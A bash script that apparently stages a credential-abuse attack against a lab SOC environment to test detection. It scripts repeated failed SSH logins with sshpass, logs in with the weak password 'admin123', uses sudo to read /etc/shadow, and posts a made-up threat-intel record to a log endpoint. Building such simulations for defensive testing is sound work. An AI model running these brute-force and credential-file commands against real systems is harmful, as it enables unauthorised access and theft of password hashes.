#!/bin/bash

echo "🔴 Starting Credential Abuse Attack Simulation..."
echo "================================================"

# Step 1: Brute Force Attack
echo "[+] Step 1: Simulating brute force attack (12 failed attempts)..."
for i in {1..12}; do
  echo "  Attempt $i/12"
  sshpass -p "wrongpass" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null wronguser@soc-auth 2>/dev/null
  sleep 2
done

echo "[+] Brute force phase complete. Waiting 5 seconds..."
sleep 5

# Step 2: Successful Login
echo "[+] Step 2: Successful admin login (credential compromise)..."
sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@soc-auth "echo 'Successfully logged in as admin'" 2>/dev/null

sleep 3

# Step 3: Privilege Escalation
echo "[+] Step 3: Attempting privilege escalation..."
sshpass -p "admin123" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@soc-auth "echo 'admin123' | sudo -S cat /etc/shadow" 2>/dev/null

# Step 4: Send enriched threat intel
echo "[+] Step 4: Injecting threat intelligence data..."
curl -X POST http://soc-logs:5000/ingest \
  -H "Content-Type: application/json" \
  -d '{
    "source": "threat_intel",
    "event": "ip_reputation",
    "ip": "172.18.0.2",
    "reputation": "malicious",
    "confidence": 0.95,
    "details": {
      "known_campaigns": ["credential_stuffing", "brute_force"],
      "last_seen": "2024-12-19"
    }
  }'

echo ""
echo "✅ Attack simulation complete!"
echo "Check the dashboard at http://localhost:8080"
echo "Check n8n workflow at http://localhost:5678"
